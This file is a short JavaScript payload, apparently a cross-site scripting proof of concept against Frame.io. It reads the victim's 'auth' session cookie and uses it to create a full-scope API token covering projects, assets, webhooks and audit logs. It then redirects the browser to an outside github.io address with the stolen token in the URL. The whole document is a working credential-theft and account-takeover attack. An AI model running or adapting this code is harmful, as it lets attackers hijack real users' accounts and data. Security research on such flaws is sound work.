// Function to get a specific cookie by name
function getCookie(name) {
    const cookies = document.cookie.split('; ');
    for (let cookie of cookies) {
        let [cookieName, cookieValue] = cookie.split('=');
        if (cookieName === name) {
            return decodeURIComponent(cookieValue.replace(/^Bearer%20/, ''));
        }
    }
    return null;
}

// Extract the JWT from the 'auth' cookie
const sessionToken = getCookie('auth');

if (sessionToken) {
    // Define the request payload
    const payload = {
        scopes: {
            account_read: true,
            team_create: true,
            team_read: true,
            team_update: true,
            project_create: true,
            project_read: true,
            project_update: true,
            project_delete: true,
            asset_create: true,
            asset_read: true,
            asset_update: true,
            asset_delete: true,
            comment_create: true,
            comment_read: true,
            comment_update: true,
            comment_delete: true,
            reviewlink_create: true,
            reviewlink_read: true,
            reviewlink_update: true,
            reviewlink_delete: true,
            presentation_create: true,
            presentation_read: true,
            presentation_update: true,
            presentation_delete: true,
            auditlog_read: true,
            webhook_create: true,
            webhook_read: true,
            webhook_update: true,
            webhook_delete: true,
            action_create: true,
            action_read: true,
            action_update: true,
            action_delete: true,
            offline: false
        },
        description: "hello world"
    };

    // Send a POST request to the API
    fetch('https://api.frame.io/v2/tokens', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${sessionToken}`,
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Origin': 'https://static-assets.frame.io',
            'Referer': 'https://developer.frame.io/',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        if (data.token) {
            location=`https://mrhavit.github.io/?token=${data.token}`
        } else {
            console.error('Token not found in response', data);
        }
    })
    .catch(error => console.error('Error:', error));
} else {
    console.error('Session token not found');
}
